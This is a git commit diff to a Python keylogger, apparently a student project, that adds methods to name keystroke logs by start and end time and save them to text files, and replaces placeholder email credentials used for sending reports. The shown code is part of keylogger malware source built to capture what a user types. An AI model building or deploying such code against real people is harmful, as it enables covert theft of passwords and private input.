e67d05497feac1a0371dbab92daf2d605b58396d
morrimeg <morrimeg@oregonstate.edu>
2020-12-21 14:09:00 -0700

    created methods to save keystrokes to files.

--- keylogger.py
+++ keylogger.py
@@ -6,8 +6,8 @@ from datetime import datetime
 
 # initialize parameters
 SEND_REPORT_EVERY = 60 # in seconds
-EMAIL_ADDRESS = "thisisafakegmail@gmail.com"
-EMAIL_PASSWORD = "thisisafakepassword"
+EMAIL_ADDRESS = "youremail@gmail.com"
+EMAIL_PASSWORD = "yourpassword"
 
 
 
@@ -58,5 +58,25 @@ class keyLogger():
 
         # finally, add the key name to our global `self.log` variable
         self.log += name
+
+
+
+    def update_filename(self):
+        # construct the filename to be identified by start & end datetimes
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
+
+
+    def report_to_file(self):
+        """This method creates a log file in the current directory that contains
+        the current keylogs in the `self.log` variable"""
+        # open the file in write mode (create it)
+        with open(f"{self.filename}.txt", "w") as f:
+            # write the keylogs to the file
+            print(self.log, file=f)
+
+        print(f"[+] Saved {self.filename}.txt")
 
 
